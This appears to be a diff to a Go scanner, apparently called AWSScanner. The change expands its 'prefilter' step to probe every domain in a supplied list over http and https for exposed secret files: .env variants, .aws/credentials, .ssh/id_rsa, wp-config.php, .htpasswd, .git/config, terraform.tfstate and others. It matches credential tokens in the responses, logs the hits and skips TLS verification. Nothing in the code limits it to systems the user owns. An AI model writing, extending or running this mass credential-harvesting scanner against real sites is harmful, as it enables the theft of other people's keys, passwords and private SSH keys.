@@ -6197,9 +6197,44 @@ func (a *AWSScanner) runBatched(listFile string) {
 	a.DisplaySummary()
 }
 
-// runPrefilter probes 5 .env paths per domain in parallel and writes any URL
-// whose response is HTTP 200 and whose body contains at least one of the
-// well-known secret key tokens to outputFile.
+type prefilterPath struct {
+	path   string
+	tokens []string
+	label  string
+}
+
+var prefilterPaths = []prefilterPath{
+	// .env variants
+	{path: "/.env", label: "ENV", tokens: []string{"APP_KEY=", "DB_PASSWORD=", "AWS_SECRET_ACCESS_KEY=", "API_KEY=", "SECRET_KEY=", "SENDGRID_API_KEY=", "STRIPE_SECRET_KEY=", "MAILGUN_API_KEY=", "TWILIO_AUTH_TOKEN=", "DATABASE_URL=", "REDIS_URL=", "PRIVATE_KEY=", "ACCESS_TOKEN=", "AUTH_TOKEN="}},
+	{path: "/.env.local", label: "ENV", tokens: []string{"APP_KEY=", "DB_PASSWORD=", "AWS_SECRET_ACCESS_KEY=", "API_KEY=", "SECRET_KEY=", "DATABASE_URL="}},
+	{path: "/.env.production", label: "ENV", tokens: []string{"APP_KEY=", "DB_PASSWORD=", "AWS_SECRET_ACCESS_KEY=", "API_KEY=", "SECRET_KEY=", "DATABASE_URL="}},
+	{path: "/.env.backup", label: "ENV", tokens: []string{"APP_KEY=", "DB_PASSWORD=", "AWS_SECRET_ACCESS_KEY=", "API_KEY=", "SECRET_KEY="}},
+	// Git
+	{path: "/.git/config", label: "GIT", tokens: []string{"[core]", "repositoryformatversion", "filemode", "[remote"}},
+	// WordPress
+	{path: "/wp-config.php", label: "WPCFG", tokens: []string{"DB_PASSWORD", "DB_USER", "DB_NAME", "AUTH_KEY", "table_prefix"}},
+	// AWS
+	{path: "/.aws/credentials", label: "AWS", tokens: []string{"aws_access_key_id", "aws_secret_access_key"}},
+	// npm
+	{path: "/.npmrc", label: "NPMRC", tokens: []string{"_authToken=", "//registry"}},
+	// Terraform
+	{path: "/terraform.tfstate", label: "TF", tokens: []string{"\"serial\"", "\"outputs\"", "\"resources\""}},
+	// Docker compose
+	{path: "/docker-compose.yml", label: "DOCKER", tokens: []string{"POSTGRES_PASSWORD", "MYSQL_ROOT_PASSWORD", "password:", "REDIS_PASSWORD"}},
+	// Laravel/PHP
+	{path: "/config/database.php", label: "PHPCFG", tokens: []string{"password", "database", "username"}},
+	// Python/Django
+	{path: "/settings.py", label: "DJCFG", tokens: []string{"SECRET_KEY", "DATABASES", "PASSWORD"}},
+	// htpasswd
+	{path: "/.htpasswd", label: "HTPW", tokens: []string{"$apr1$", "$2y$", "$1$", ":"}},
+	// SSH keys
+	{path: "/.ssh/id_rsa", label: "SSHKEY", tokens: []string{"-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----"}},
+	// phpinfo
+	{path: "/phpinfo.php", label: "PHPINF", tokens: []string{"PHP Version", "<title>phpinfo()"}},
+}
+
+// runPrefilter probes high-value credential exposure paths for each domain in
+// parallel and writes any hit URL (with label and path prefix) to outputFile.
 func runPrefilter(listFile, outputFile string, threads int) {
 	// Read domains from listFile.
 	domFile, err := os.Open(listFile)
@@ -6227,32 +6262,20 @@ func runPrefilter(listFile, outputFile string, threads int) {
 		fmt.Fprintf(os.Stderr, "[PREFILTER] read error: %v\n", err)
 	}
 
-	// Build the full list of URLs to probe (5 paths per domain).
-	envPaths := []string{
-		"/.env",
-		"/.env.local",
-		"/api/.env",
-		"/.env.production",
+	// Build the full list of (url, prefilterPath) pairs — both http and https
+	// for every path group.
+	type probeTarget struct {
+		url  string
+		pp   prefilterPath
 	}
-	var targets []string
+	var targets []probeTarget
 	for _, domain := range domains {
-		// /.env gets both http and https; the rest are http-only.
-		targets = append(targets, "http://"+domain+"/.env")
-		targets = append(targets, "https://"+domain+"/.env")
-		for _, p := range envPaths[1:] {
-			targets = append(targets, "http://"+domain+p)
+		for _, pp := range prefilterPaths {
+			targets = append(targets, probeTarget{url: "http://" + domain + pp.path, pp: pp})
+			targets = append(targets, probeTarget{url: "https://" + domain + pp.path, pp: pp})
 		}
 	}
-
-	secretTokens := []string{
-		"APP_KEY=",
-		"DB_PASSWORD=",
-		"AWS_SECRET_ACCESS_KEY=",
-		"API_KEY=",
-		"SECRET_KEY=",
-		"SENDGRID_API_KEY=",
-		"STRIPE_SECRET_KEY=",
-	}
+	totalProbes := len(targets)
 
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
@@ -6266,29 +6289,47 @@ func runPrefilter(listFile, outputFile string, threads int) {
 	defer outFile.Close()
 
 	var (
-		mu       sync.Mutex
-		hitCount int
+		mu         sync.Mutex
+		hitCount   int
+		probeCount int
 	)
 
 	sem := make(chan struct{}, threads)
 	var wg sync.WaitGroup
 
-	for _, target := range targets {
+	for _, t := range targets {
 		wg.Add(1)
 		sem <- struct{}{}
-		go func(rawURL string) {
+		go func(pt probeTarget) {
 			defer wg.Done()
 			defer func() { <-sem }()
 
-			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+			ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second)
 			defer cancel()
 
-			req, reqErr := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
+			req, reqErr := http.NewRequestWithContext(ctx, "GET", pt.url, nil)
 			if reqErr != nil {
+				mu.Lock()
+				probeCount++
+				mu.Unlock()
 				return
 			}
-			httpClient := &http.Client{Transport: transport, Timeout: 5 * time.Second}
+			httpClient := &http.Client{Transport: transport, Timeout: 4 * time.Second}
 			resp, doErr := httpClient.Do(req)
+
+			mu.Lock()
+			probeCount++
+			current := probeCount
+			mu.Unlock()
+
+			// Progress line every 1000 probes.
+			if current%1000 == 0 {
+				mu.Lock()
+				hc := hitCount
+				mu.Unlock()
+				fmt.Printf("[PREFILTER] checked %d/%d | hits: %d\n", current, totalProbes, hc)
+			}
+
 			if doErr != nil {
 				return
 			}
@@ -6304,21 +6345,22 @@ func runPrefilter(listFile, outputFile string, threads int) {
 			}
 			body := string(bodyBytes)
 
-			for _, token := range secretTokens {
+			for _, token := range pt.pp.tokens {
 				if strings.Contains(body, token) {
-					fmt.Printf("[PREFILTER] hit: %s\n", rawURL)
+					line := pt.pp.label + ":" + pt.pp.path + ":" + pt.url
+					fmt.Printf("[PREFILTER] hit: %s\n", line)
 					mu.Lock()
-					fmt.Fprintln(outFile, rawURL)
+					fmt.Fprintln(outFile, line)
 					hitCount++
 					mu.Unlock()
 					return
 				}
 			}
-		}(target)
+		}(t)
 	}
 
 	wg.Wait()
-	fmt.Printf("Prefilter complete: %d hits from %d domains\n", hitCount, len(domains))
+	fmt.Printf("PREFILTER_DONE:%d:%d\n", hitCount, totalProbes)
 }
 
 func main() {
